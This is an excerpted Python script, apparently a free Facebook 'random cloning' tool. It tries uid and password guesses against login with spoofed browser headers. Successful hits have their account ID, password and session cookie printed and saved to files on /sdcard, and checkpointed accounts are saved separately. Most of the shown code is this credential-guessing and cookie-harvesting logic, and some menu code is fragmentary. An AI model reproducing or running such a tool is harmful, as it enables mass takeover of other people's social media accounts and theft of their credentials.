...
def error(dark):
    for i in track(range(500),description=dark):
        time.sleep(0.01) 
...
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mTools  \033[1;31m   ● \x1b[38;5;46m-Random Cloning
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mType  \033[1;31m    ● \x1b[38;5;46m-FREE

\033[1;92m       Tool Work = wifi+Data !
...
def ERROR():
    ...
    linex()
    dark=input(' \033[1;32m[?] SELECT MENU: ')
    if dark in['1','01']:error()
    elif dark in['0','00']:exit()
    else:exit()
...
def mumitx(uid,pwx,tl):
    ...
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="115.0.5805.224", "Google Chrome";v="115.0.5805.224"',
    'sec-ch-ua-mobile': '?0',
    ...
    'user-agent': pro,}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[MAHAFUZ-OK😻] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                print('\033[1;32m[COOKIE-🤭] = \033[1;37m'+coki+ '')
                cek_apk(session,coki)
                open('/sdcard/MAHAFUZ-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[1;30m[MAHAFUZ-CP😭]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/MAHAFUZ-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mMAHAFUZ\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
